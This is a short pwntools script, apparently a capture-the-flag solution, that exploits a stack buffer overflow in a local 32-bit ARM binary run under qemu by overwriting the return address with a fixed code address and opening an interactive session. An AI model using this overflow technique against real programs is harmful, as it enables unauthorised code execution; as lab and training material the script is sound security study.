from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)
io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

pay = b'A'*0x24 + p32(0x000105EC)
io.sendlineafter(b'> ', pay)
io.interactive()
